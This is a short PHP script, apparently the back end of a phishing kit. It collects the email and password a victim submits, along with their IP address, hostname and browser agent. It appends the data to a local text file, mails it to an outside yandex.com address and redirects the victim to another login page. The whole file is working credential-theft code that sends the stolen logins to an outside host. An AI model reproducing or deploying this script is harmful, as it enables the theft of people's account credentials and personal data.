<?php
session_start();
ob_start();

//Getting user ip & hostname
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$agent = @$_SERVER['HTTP_USER_AGENT'];



//Getting UserID info from Session
$_SESSION['username'] = $username = $_POST['u'];
$_SESSION['password'] = $password = $_POST['p'];



$jayd="==================+[ User Info - LION ]+==================
Email: $username
Password   : $password
-------------------+	+---------------------
Client IP: $ip
Check IP: https://geoiptool.com/en/?ip=$ip
Hostname: $hostname
Agent: $agent
-----------------+  +-----------------";

$fp = fopen('formdata.txt','a');
$savestring = $jayd."\n";
fwrite($fp, $savestring);
fclose($fp);

$recipient="ogwuego@yandex.com";
$subject ="WELCOME LOGZ QQ"."\n";
$headers = "From: JAY";

$Redirect="loginX.php";

if(mail($recipient,$subject,$jayd,$headers)){
    
header("Location: $Redirect");

}

?>